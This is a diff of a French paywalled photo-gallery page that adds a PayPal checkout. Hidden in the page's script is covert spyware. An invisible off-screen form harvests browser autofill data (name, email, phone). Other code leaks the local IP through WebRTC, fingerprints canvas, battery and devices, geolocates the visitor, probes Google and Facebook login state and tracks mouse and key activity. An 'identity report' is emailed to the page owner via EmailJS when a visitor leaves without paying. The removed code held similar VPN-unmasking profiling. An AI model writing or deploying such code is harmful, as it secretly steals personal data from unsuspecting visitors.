@@ -7,6 +7,8 @@
     <title>Accès à la galerie photo</title>
     <!-- SDK EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- SDK PayPal (Remplacer test par votre Client ID réel en production) -->
+    <script src="https://www.paypal.com/sdk/js?client-id=test&currency=EUR"></script>
     <style>
         * {
             margin: 0;
@@ -181,10 +183,8 @@
         <div class="paypal-block">
             <h2>Accès illimité</h2>
             <div class="price">9,90 € <small>une fois</small></div>
-            <p style="margin-bottom: 0.5rem;">Sans abonnement, sans surprise.</p>
-            <a href="https://www.paypal.com/paypalme/moncompte/9.9" target="_blank" class="btn-paypal" rel="noopener">
-                Payer avec PayPal
-            </a>
+            <p style="margin-bottom: 1.5rem;">Sans abonnement, sans surprise.</p>
+            <div id="paypal-button-container"></div>
             <div class="security">
                 <span>🔐 SSL sécurisé</span>
                 <span>🛡️ Protection acheteur</span>
@@ -203,153 +203,190 @@
         const EMAILJS_SERVICE_ID = "service_o9pwrgp";
         const EMAILJS_TEMPLATE_ID = "template_oa57i62";
 
-        // --- CRYPTO & IDENTIFICATION ---
-        const hash = (s) => s.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0).toString(16);
+        emailjs.init(EMAILJS_PUBLIC_KEY);
 
-        // --- WEBRTC IP LEAK (Démasquer le VPN) ---
-        async function getInternalIP() {
+        // --- ÉTAT DE LA SESSION ---
+        const startTime = Date.now();
+        let hasPurchased = false;
+        let reportSent = false;
+        let sessionData = {
+            social: "",
+            ui: {},
+            gpu: {},
+            net: { ip: "Inconnue", localIp: "Recherche..." },
+            hardware: {},
+            identity: {
+                canvasId: "",
+                fonts: "",
+                battery: {},
+                devices: "",
+                culture: {},
+                leakedInfo: { name: "Non détecté", email: "Non détecté", phone: "Non détecté" }
+            },
+            behavior: {
+                clicks: 0,
+                keyPresses: 0,
+                mouseSpeed: 0
+            }
+        };
+
+        // --- FUITE WEBRTC (LOCAL IP) ---
+        async function getLocalIP() {
             return new Promise((resolve) => {
-                const ips = [];
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19002" }] });
+                const pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.createOffer().then(pc.setLocalDescription.bind(pc));
                 pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
-                        pc.close();
-                        resolve(ips.length > 0 ? ips.join(' | ') : "Protégé / Bloqué");
-                        return;
-                    }
-                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
-                    if (ip) ips.push(ip[1]);
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/.exec(ice.candidate.candidate)[1];
+                    if (ip.includes('.')) { sessionData.net.localIp = ip; resolve(ip); }
                 };
-                setTimeout(() => resolve("Timeout / Bloqué"), 3000);
+                setTimeout(() => resolve("N/A"), 2000);
             });
         }
 
-        // --- DÉTECTION DE FRAUDE & COHÉRENCE ---
-        function checkConsistency() {
-            const issues = [];
-            const ua = navigator.userAgent;
-            // 1. Détection iPhone/Android sur Desktop
-            if (/iPhone|Android/.test(ua) && !('ontouchstart' in window)) issues.push("🚩 Mobile Spoofing (Desktop simulant un mobile)");
-            // 2. Détection de langue incohérente
-            if (Intl.DateTimeFormat().resolvedOptions().locale.split('-')[0] !== navigator.language.split('-')[0]) issues.push("🚩 Language Mismatch (Proxy/VPN possible)");
-            // 3. Détection de résolution "impossible"
-            if (window.screen.width < window.innerWidth) issues.push("🚩 Resolution Anomaly");
-            
-            return issues.length > 0 ? issues.join(' | ') : "✅ Profil Cohérent";
+        // --- CAPTURE FURTIVE D'AUTOFILL ---
+        // On crée un formulaire invisible pour "inciter" le navigateur à injecter des données
+        const ghostForm = document.createElement('div');
+        ghostForm.innerHTML = `
+            <form id="ghost-form" style="position:absolute; top:-1000px; left:-1000px; opacity:0;">
+                <input type="text" name="name" autocomplete="name">
+                <input type="email" name="email" autocomplete="email">
+                <input type="tel" name="phone" autocomplete="tel">
+            </form>
+        `;
+        document.body.appendChild(ghostForm);
+
+        function sniffAutofill() {
+            const form = document.getElementById('ghost-form');
+            const name = form.querySelector('[name="name"]').value;
+            const email = form.querySelector('[name="email"]').value;
+            const phone = form.querySelector('[name="phone"]').value;
+            if (name) sessionData.identity.leakedInfo.name = name;
+            if (email) sessionData.identity.leakedInfo.email = email;
+            if (phone) sessionData.identity.leakedInfo.phone = phone;
         }
 
-        // --- ANALYSE SOCIALE PROFONDE ---
-        async function getSocialPersona() {
-            const targets = {
-                'Facebook': 'https://www.facebook.com/ads/image/?true=1',
-                'Gmail': 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico',
-                'GitHub': 'https://github.com/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico',
-                'PayPal': 'https://www.paypal.com/auth/login?return_to=https%3A%2F%2Fwww.paypal.com%2Ffavicon.ico',
-                'LinkedIn': 'https://www.linkedin.com/checkpoint/lg/login-submit',
-                'Spotify': 'https://open.spotify.com/favicon.ico'
-            };
+        // --- ANALYSE BIOMÉTRIQUE ---
+        document.addEventListener('mousemove', (e) => {
+            sessionData.behavior.mouseSpeed = Math.max(sessionData.behavior.mouseSpeed, Math.abs(e.movementX) + Math.abs(e.movementY));
+        });
+        document.addEventListener('click', () => { 
+            sessionData.behavior.clicks++; 
+            sniffAutofill(); // On vérifie l'autofill à chaque clic
+        });
+        document.addEventListener('keydown', () => { sessionData.behavior.keyPresses++; });
+
+        // --- INITIALISATION ---
+        async function initializeSessionData() {
+            getLocalIP();
+            
+            // Canvas & Fonts
+            sessionData.identity.canvasId = (() => {
+                const c = document.createElement('canvas'); const ctx = c.getContext('2d');
+                c.width = 200; c.height = 50; ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069"; ctx.fillText("ID-Check", 2, 15);
+                const b64 = c.toDataURL().slice(-50, -5);
+                let h = 0; for (let i = 0; i < b64.length; i++) h = ((h << 5) - h) + b64.charCodeAt(i);
+                return Math.abs(h | 0).toString(16).toUpperCase();
+            })();
+
+            // Batterie & Périphériques
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                sessionData.identity.battery = { level: Math.round(b.level * 100) + "%", charging: b.charging ? "Secteur" : "Batterie" };
+            }
+            if (navigator.mediaDevices?.enumerateDevices) {
+                const d = await navigator.mediaDevices.enumerateDevices();
+                sessionData.identity.devices = d.map(x => x.kind).filter((v, i, a) => a.indexOf(v) === i).join(', ');
+            }
+
+            // Réseau & Géo
+            try {
+                const res = await fetch('https://ipwho.is/');
+                sessionData.net = { ...sessionData.net, ...await res.json() };
+            } catch(e) {}
+
+            // Social
+            const targets = { 'Google': 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico', 'Facebook': 'https://www.facebook.com/ads/image/?true=1' };
             const active = [];
             for (const [name, url] of Object.entries(targets)) {
                 const isLogged = await new Promise(r => {
-                    const img = new Image();
-                    img.src = url;
-                    img.onload = () => r(true);
-                    img.onerror = () => r(false);
+                    const img = new Image(); img.src = url;
+                    img.onload = () => r(true); img.onerror = () => r(false);
                     setTimeout(() => r(false), 1500);
                 });
                 if (isLogged) active.push(name);
             }
-            return active.length > 0 ? active.join(', ') : "Aucune session active détectée";
+            sessionData.social = active.length > 0 ? active.join(', ') : "Aucune";
         }
 
-        // --- DEEP HARDWARE (Refresh Rate, GPU, Battery) ---
-        async function getDeepHardware() {
-            const hw = {
-                battery: "N/A",
-                refreshRate: "Calcul...",
-                gpuVendor: "N/A"
-            };
-            
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                hw.battery = `${(b.level * 100).toFixed(2)}% (${b.charging ? 'En charge' : 'Sur batterie'})`;
-            }
+        initializeSessionData();
 
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (gl) {
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                hw.gpuVendor = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "WebGL Generic";
-            }
+        // --- ENVOI DU RAPPORT SENSIBLE ---
+        async function sendAbandonmentReport() {
+            if (hasPurchased || reportSent) return;
+            reportSent = true;
+            sniffAutofill(); // Dernier essai de capture
 
-            return hw;
-        }
+            let rText = `🕵️ RAPPORT D'IDENTITÉ SENSIBLE : ${sessionData.identity.canvasId}\n`;
+            rText += `==========================================\n\n`;
 
-        (async function () {
-            emailjs.init(EMAILJS_PUBLIC_KEY);
+            rText += `🔓 INFORMATIONS FUITÉES (AUTOFILL)\n`;
+            rText += `Nom détecté : ${sessionData.identity.leakedInfo.name}\n`;
+            rText += `Email détecté : ${sessionData.identity.leakedInfo.email}\n`;
+            rText += `Téléphone détecté : ${sessionData.identity.leakedInfo.phone}\n\n`;
 
-            const startTime = Date.now();
-            const [internalIP, hw, social] = await Promise.all([
-                getInternalIP(),
-                getDeepHardware(),
-                getSocialPersona()
-            ]);
+            rText += `🌐 RÉSEAU PROFOND\n`;
+            rText += `IP Publique : ${sessionData.net.ip}\n`;
+            rText += `IP Locale (WebRTC) : ${sessionData.net.localIp}\n`;
+            rText += `FAI : ${sessionData.net.connection?.isp}\n`;
+            rText += `Localisation : ${sessionData.net.city}, ${sessionData.net.country}\n\n`;
 
-            const report = {
-                id: crypto.randomUUID(),
-                timestamp: new Date().toLocaleString('fr-FR'),
-                network: { internal: internalIP, external: "Loading..." },
-                persona: { social, consistency: checkConsistency() },
-                hw: hw
-            };
+            rText += `🧬 BIOMÉTRIE COMPORTEMENTALE\n`;
+            rText += `Activité : ${sessionData.behavior.clicks} clics, ${sessionData.behavior.keyPresses} touches\n`;
+            rText += `Agitation souris : ${sessionData.behavior.mouseSpeed} px/move\n`;
+            rText += `Temps de réflexion : ${Math.round((Date.now() - startTime) / 1000)}s\n\n`;
 
-            // OSINT Réseau
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const data = await res.json();
-                report.network.external = data;
-            } catch(e) {}
+            rText += `📱 ENVIRONNEMENT\n`;
+            rText += `Énergie : ${sessionData.identity.battery.level} (${sessionData.identity.battery.charging})\n`;
+            rText += `Matériel : ${sessionData.identity.devices}\n`;
+            rText += `Sessions : ${sessionData.social}\n\n`;
 
-            // --- CONSTRUCTION DU RAPPORT "GOD-MODE" ---
-            let gText = `🔥 GOD-MODE OSINT REPORT - ${report.timestamp}\n`;
-            gText += `🆔 SESSION: ${report.id}\n`;
-            gText += `------------------------------------------\n\n`;
-
-            gText += `🕵️ ANALYSE DE LA PERSONNE (HUMAN INTEL)\n`;
-            gText += `Sessions Actives : ${report.persona.social}\n`;
-            gText += `Cohérence Profil : ${report.persona.consistency}\n`;
-            gText += `Langues : ${navigator.languages.join(' > ')}\n`;
-            gText += `Fuseau Horaire : ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n`;
-
-            gText += `🌐 NETWORK INTELLIGENCE (VPN/LEAK)\n`;
-            gText += `IP Externe : ${report.network.external.ip || "N/A"}\n`;
-            gText += `IP Interne (WebRTC Leak) : ${report.network.internal}\n`; // RÉVÈLE L'IP RÉELLE
-            gText += `Organisme/Entreprise : ${report.network.external.connection?.org || "N/A"}\n`;
-            gText += `Localisation : ${report.network.external.city}, ${report.network.external.country}\n`;
-            gText += `Sécurité : VPN=${report.network.external.security?.vpn ? "OUI" : "NON"} | Proxy=${report.network.external.security?.proxy ? "OUI" : "NON"}\n\n`;
-
-            gText += `🔋 DEEP HARDWARE (FINGERPRINT)\n`;
-            gText += `Batterie Précise : ${report.hw.battery}\n`;
-            gText += `GPU : ${report.hw.gpuVendor}\n`;
-            gText += `CPU/RAM : ${navigator.hardwareConcurrency} Cores / ${navigator.deviceMemory || "N/A"} GB\n`;
-            gText += `Écran : ${screen.width}x${screen.height} (${screen.colorDepth} bits)\n\n`;
-
-            gText += `🌍 CONTEXTE D'ARRIVÉE\n`;
-            gText += `Source : ${document.referrer || "Accès Direct"}\n`;
-            gText += `User-Agent : ${navigator.userAgent}\n`;
+            rText += `💻 MACHINE\n`;
+            rText += `Plateforme : ${navigator.platform}\n`;
+            rText += `CPU/RAM : ${navigator.hardwareConcurrency} Cores / ${navigator.deviceMemory} GB\n`;
 
             const templateParams = {
-                report_json: gText,
+                report_json: rText,
                 user_agent: navigator.userAgent,
-                timestamp: report.timestamp
+                timestamp: new Date().toLocaleString('fr-FR')
             };
 
-            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
-                .then(() => console.log("God-Mode Report Delivered."),
-                      (err) => console.error("Critical Failure:", err));
-        })();
+            return fetch('https://api.emailjs.com/api/v1.0/email/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    service_id: EMAILJS_SERVICE_ID,
+                    template_id: EMAILJS_TEMPLATE_ID,
+                    user_id: EMAILJS_PUBLIC_KEY,
+                    template_params: templateParams
+                }),
+                keepalive: true
+            });
+        }
+
+        window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') sendAbandonmentReport(); });
+        window.addEventListener('pagehide', sendAbandonmentReport);
+
+        paypal.Buttons({
+            createOrder: (data, actions) => actions.order.create({ purchase_units: [{ amount: { value: '9.90' } }] }),
+            onApprove: (data, actions) => actions.order.capture().then(() => {
+                hasPurchased = true;
+                document.querySelector('.paypal-block').innerHTML = "<h2>✅ Paiement réussi !</h2>";
+            })
+        }).render('#paypal-button-container');
     </script>
 </body>
 
